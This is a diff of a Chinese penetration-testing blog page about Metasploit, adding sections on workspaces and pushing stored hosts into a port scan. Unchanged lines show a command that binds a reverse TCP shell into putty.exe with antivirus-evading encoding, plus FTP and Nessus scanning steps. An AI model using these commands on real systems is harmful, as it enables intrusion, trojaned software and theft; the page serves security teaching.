@@ -111,7 +111,7 @@
 <meta property="og:site_name" content="默小文">
 <meta property="og:description" content="如何使用 MetaSploit 在内网中渗透最大化，阅读全文查看内网渗透神器的利用姿势。">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2018-03-13T02:44:23.000Z">
+<meta property="og:updated_time" content="2018-04-12T07:08:41.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="MetaSploit内网渗透全技巧">
 <meta name="twitter:description" content="如何使用 MetaSploit 在内网中渗透最大化，阅读全文查看内网渗透神器的利用姿势。">
@@ -195,7 +195,7 @@
       </a>
     </div>
       
-        <p class="site-subtitle">当你在眺望深渊时，深渊也在眺望你</p>
+        <h1 class="site-subtitle" itemprop="description">当你在眺望深渊时，深渊也在眺望你</h1>
       
   </div>
 
@@ -327,7 +327,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">MetaSploit内网渗透全技巧</h1>
+          <h2 class="post-title" itemprop="name headline">MetaSploit内网渗透全技巧</h2>
         
 
         <div class="post-meta">
@@ -528,6 +528,20 @@
 <h3 id="暗度陈仓—猥琐执行payload-绑定到可执行文件"><a href="#暗度陈仓—猥琐执行payload-绑定到可执行文件" class="headerlink" title="暗度陈仓—猥琐执行payload (绑定到可执行文件)"></a>暗度陈仓—猥琐执行payload (绑定到可执行文件)</h3><p>绑定payload 至一个可执行文件，让目标不知不觉间中招，以putty.exe 为例： </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=8080 R | msfencode </span><br><span class="line">–t exe –x putty.exe -o /var/www/putty_backdoor.exe –e x86/shikata_ga_nai –k –c 5</span><br></pre></td></tr></table></figure>
 <p>假如选择一个GUI 界面的程序作为绑定目标并且不使用-k 选项，则目标执行此程序的时候不会弹出cmd 窗口，-k 选项的作用是payload 独立于模板软件的进程运行。</p>
+<h3 id="MetaSploit-创建工作空间"><a href="#MetaSploit-创建工作空间" class="headerlink" title="MetaSploit 创建工作空间"></a>MetaSploit 创建工作空间</h3><p>很多时候，你要在不同的环境下，渗透不同的目标，这个时候 hosts中的IP会很乱，你就需要工作空间来区分开你每次不同的渗透环境中的操作与存储，来说说Metasploit中的 <code>workspace</code> </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; workspace -h</span><br><span class="line">Usage:</span><br><span class="line">    workspace                  List workspaces</span><br><span class="line">    workspace -v               List workspaces verbosely</span><br><span class="line">    workspace [name]           Switch workspace</span><br><span class="line">    workspace -a [name] ...    Add workspace(s)</span><br><span class="line">    workspace -d [name] ...    Delete workspace(s)</span><br><span class="line">    workspace -D               Delete all workspaces</span><br><span class="line">    workspace -r &lt;old&gt; &lt;new&gt;   Rename workspace</span><br><span class="line">    workspace -h               Show this help information</span><br></pre></td></tr></table></figure>
+<p>比较常用的命令：</p>
+<p>添加工作空间</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; workspace -a imworkspaceone</span><br><span class="line">[*] Added imworkspaceone</span><br><span class="line">msf &gt;</span><br></pre></td></tr></table></figure>
+<p>选择工作空间</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; workspace imworkspaceone </span><br><span class="line">[*] Workspace: imworkspaceone</span><br></pre></td></tr></table></figure>
+<p>删除工作空间</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; workspace -d imworkspaceone</span><br><span class="line">[*] Deleted workspace: imworkspaceone</span><br><span class="line">[*] Switched workspace: default</span><br><span class="line">msf &gt;</span><br></pre></td></tr></table></figure>
+<p>操作多个工作空间来分离渗透操作与数据。</p>
+<h3 id="使用-Hosts-中的IP定向渗透"><a href="#使用-Hosts-中的IP定向渗透" class="headerlink" title="使用 Hosts 中的IP定向渗透"></a>使用 Hosts 中的IP定向渗透</h3><p>当你选择好了你的攻击模块的时候 ，想要将 <code>RHOSTS</code> 中的IP列表设置为<code>Hosts</code>中的IP（这里你需要Hosts中有IP才行，可以选中用 <code>db_import</code> 导入，也可以用 <code>db_nmap</code> 扫描获取）</p>
+<p>首先配置你的攻击模块，然后 <code>show options</code> 查看需要配置目标的配置项是RHOSTS还是RHOST，当需要设置RHOSTS的时候 <code>hosts -c address -R</code> 就将hosts中所有IP地址的列表传送给了RHOSTS，执行run 向metasploit发送执行命令。</p>
+<p>以下是一个例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/portscan/tcp</span><br><span class="line">msf auxiliary(scanner/portscan/tcp) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/portscan/tcp):</span><br><span class="line"></span><br><span class="line">   Name         Current Setting  Required  Description</span><br><span class="line">   ----         ---------------  --------  -----------</span><br><span class="line">   CONCURRENCY  10               yes       The number of concurrent ports to check per host</span><br><span class="line">   DELAY        0                yes       The delay between connections, per thread, in milliseconds</span><br><span class="line">   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.</span><br><span class="line">   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)</span><br><span class="line">   RHOSTS                        yes       The target address range or CIDR identifier</span><br><span class="line">   THREADS      1                yes       The number of concurrent threads</span><br><span class="line">   TIMEOUT      1000             yes       The socket connect timeout in milliseconds</span><br><span class="line"></span><br><span class="line">msf auxiliary(scanner/portscan/tcp) &gt; hosts -c address -R</span><br><span class="line"></span><br><span class="line">Hosts</span><br><span class="line">=====</span><br><span class="line"></span><br><span class="line">address</span><br><span class="line">-------</span><br><span class="line">10.12.103.171</span><br><span class="line">10.12.103.172</span><br><span class="line">10.12.103.173</span><br><span class="line">10.12.103.174</span><br><span class="line">10.12.103.191</span><br><span class="line">10.12.103.192</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">10.14.80.212</span><br><span class="line">10.14.80.213</span><br><span class="line">10.14.80.214</span><br><span class="line">10.14.80.215</span><br><span class="line">10.14.80.216</span><br><span class="line"></span><br><span class="line">RHOSTS =&gt; file:/var/folders/0n/78ntbx595w3fll8tn5gk4t3c0000gn/T/msf-db-rhosts-20180412-7048-17nfta1</span><br><span class="line"></span><br><span class="line">msf auxiliary(scanner/portscan/tcp) &gt; run</span><br><span class="line"></span><br><span class="line">[+] 10.12.103.171:        - 10.12.103.171:22 - TCP OPEN</span><br><span class="line">[+] 10.12.103.171:        - 10.12.103.171:80 - TCP OPEN</span><br><span class="line">[+] 10.12.103.171:        - 10.12.103.171:111 - TCP OPEN</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
 <h2 id="常用渗透手段"><a href="#常用渗透手段" class="headerlink" title="常用渗透手段"></a>常用渗透手段</h2><h3 id="扫描匿名FTP"><a href="#扫描匿名FTP" class="headerlink" title="扫描匿名FTP"></a>扫描匿名FTP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/ftp/anonymos </span><br><span class="line">set RHOSTS 192.168.1.0/24 </span><br><span class="line">set THREADS 50 </span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 <h3 id="与nessus-结合扫描"><a href="#与nessus-结合扫描" class="headerlink" title="与nessus 结合扫描"></a>与nessus 结合扫描</h3><p>使用Nessus 扫描完成后生成.nessus 格式的报告，导入到MSF： </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">db_connect postgres:toor@127.0.0.1/msf </span><br><span class="line">db_import /tmp/nessus_report_Host_test.nessus </span><br><span class="line">db_hosts –c address,svcs,vulns </span><br><span class="line">db_vulns</span><br></pre></td></tr></table></figure>
@@ -665,7 +679,7 @@
                 
                   <a href="../../../../archives/">
                 
-                    <span class="site-state-item-count">9</span>
+                    <span class="site-state-item-count">11</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -682,7 +696,9 @@
                     
                       
                     
-                    <span class="site-state-item-count">2</span>
+                      
+                    
+                    <span class="site-state-item-count">3</span>
                     <span class="site-state-item-name">分类</span>
                   </a>
                 </div>
@@ -721,7 +737,17 @@
                     
                       
                     
-                    <span class="site-state-item-count">13</span>
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">18</span>
                     <span class="site-state-item-name">标签</span>
                   </a>
                 </div>
@@ -764,7 +790,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#技巧汇总"><span class="nav-number">1.</span> <span class="nav-text">技巧汇总</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#内网代理"><span class="nav-number">1.1.</span> <span class="nav-text">内网代理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#权限提升"><span class="nav-number">1.2.</span> <span class="nav-text">权限提升</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#令牌窃取与模拟"><span class="nav-number">1.3.</span> <span class="nav-text">令牌窃取与模拟</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BypassUAC"><span class="nav-number">1.4.</span> <span class="nav-text">BypassUAC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HashDump"><span class="nav-number">1.5.</span> <span class="nav-text">HashDump</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#权限维持"><span class="nav-number">1.6.</span> <span class="nav-text">权限维持</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞扫描"><span class="nav-number">1.7.</span> <span class="nav-text">漏洞扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#读取系统账号密码"><span class="nav-number">1.8.</span> <span class="nav-text">读取系统账号密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#键盘记录"><span class="nav-number">1.9.</span> <span class="nav-text">键盘记录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#进程权限迁移"><span class="nav-number">1.10.</span> <span class="nav-text">进程权限迁移</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#关闭杀毒软件"><span class="nav-number">1.11.</span> <span class="nav-text">关闭杀毒软件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取系统流量"><span class="nav-number">1.12.</span> <span class="nav-text">获取系统流量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取目标网络共享"><span class="nav-number">1.13.</span> <span class="nav-text">获取目标网络共享</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#VNC远程界面控制"><span class="nav-number">1.14.</span> <span class="nav-text">VNC远程界面控制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows-API编程-Hello-World弹窗"><span class="nav-number">1.15.</span> <span class="nav-text">Windows API编程 , Hello World弹窗</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#编码绕过杀软"><span class="nav-number">1.16.</span> <span class="nav-text">编码绕过杀软</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#自定义可执行程序模板"><span class="nav-number">1.17.</span> <span class="nav-text">自定义可执行程序模板</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#暗度陈仓—猥琐执行payload-绑定到可执行文件"><span class="nav-number">1.18.</span> <span class="nav-text">暗度陈仓—猥琐执行payload (绑定到可执行文件)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#常用渗透手段"><span class="nav-number">2.</span> <span class="nav-text">常用渗透手段</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#扫描匿名FTP"><span class="nav-number">2.1.</span> <span class="nav-text">扫描匿名FTP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#与nessus-结合扫描"><span class="nav-number">2.2.</span> <span class="nav-text">与nessus 结合扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SMB弱口令扫描"><span class="nav-number">2.3.</span> <span class="nav-text">SMB弱口令扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#VNC空口令扫描"><span class="nav-number">2.4.</span> <span class="nav-text">VNC空口令扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Open-X11空口令"><span class="nav-number">2.5.</span> <span class="nav-text">Open X11空口令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Msf自动化测试-一行命令执行"><span class="nav-number">2.6.</span> <span class="nav-text">Msf自动化测试(一行命令执行)</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#技巧汇总"><span class="nav-number">1.</span> <span class="nav-text">技巧汇总</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#内网代理"><span class="nav-number">1.1.</span> <span class="nav-text">内网代理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#权限提升"><span class="nav-number">1.2.</span> <span class="nav-text">权限提升</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#令牌窃取与模拟"><span class="nav-number">1.3.</span> <span class="nav-text">令牌窃取与模拟</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BypassUAC"><span class="nav-number">1.4.</span> <span class="nav-text">BypassUAC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HashDump"><span class="nav-number">1.5.</span> <span class="nav-text">HashDump</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#权限维持"><span class="nav-number">1.6.</span> <span class="nav-text">权限维持</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞扫描"><span class="nav-number">1.7.</span> <span class="nav-text">漏洞扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#读取系统账号密码"><span class="nav-number">1.8.</span> <span class="nav-text">读取系统账号密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#键盘记录"><span class="nav-number">1.9.</span> <span class="nav-text">键盘记录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#进程权限迁移"><span class="nav-number">1.10.</span> <span class="nav-text">进程权限迁移</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#关闭杀毒软件"><span class="nav-number">1.11.</span> <span class="nav-text">关闭杀毒软件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取系统流量"><span class="nav-number">1.12.</span> <span class="nav-text">获取系统流量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取目标网络共享"><span class="nav-number">1.13.</span> <span class="nav-text">获取目标网络共享</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#VNC远程界面控制"><span class="nav-number">1.14.</span> <span class="nav-text">VNC远程界面控制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows-API编程-Hello-World弹窗"><span class="nav-number">1.15.</span> <span class="nav-text">Windows API编程 , Hello World弹窗</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#编码绕过杀软"><span class="nav-number">1.16.</span> <span class="nav-text">编码绕过杀软</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#自定义可执行程序模板"><span class="nav-number">1.17.</span> <span class="nav-text">自定义可执行程序模板</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#暗度陈仓—猥琐执行payload-绑定到可执行文件"><span class="nav-number">1.18.</span> <span class="nav-text">暗度陈仓—猥琐执行payload (绑定到可执行文件)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MetaSploit-创建工作空间"><span class="nav-number">1.19.</span> <span class="nav-text">MetaSploit 创建工作空间</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用-Hosts-中的IP定向渗透"><span class="nav-number">1.20.</span> <span class="nav-text">使用 Hosts 中的IP定向渗透</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#常用渗透手段"><span class="nav-number">2.</span> <span class="nav-text">常用渗透手段</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#扫描匿名FTP"><span class="nav-number">2.1.</span> <span class="nav-text">扫描匿名FTP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#与nessus-结合扫描"><span class="nav-number">2.2.</span> <span class="nav-text">与nessus 结合扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SMB弱口令扫描"><span class="nav-number">2.3.</span> <span class="nav-text">SMB弱口令扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#VNC空口令扫描"><span class="nav-number">2.4.</span> <span class="nav-text">VNC空口令扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Open-X11空口令"><span class="nav-number">2.5.</span> <span class="nav-text">Open X11空口令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Msf自动化测试-一行命令执行"><span class="nav-number">2.6.</span> <span class="nav-text">Msf自动化测试(一行命令执行)</span></a></li></ol></li></ol></div>
             
 
           </div>
@@ -796,9 +822,11 @@
 </div>
 
 
+  
 
 
-  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" rel="external nofollow" href="https://hexo.io">Hexo</a> 强力驱动</div>
 
 
 
@@ -806,7 +834,7 @@
 
 
 
-  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/theme-next/hexo-theme-next">NexT.Pisces</a> v6.0.4</div>
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" rel="external nofollow" href="https://github.com/theme-next/hexo-theme-next">NexT.Pisces</a> v6.0.4</div>
 
 
 
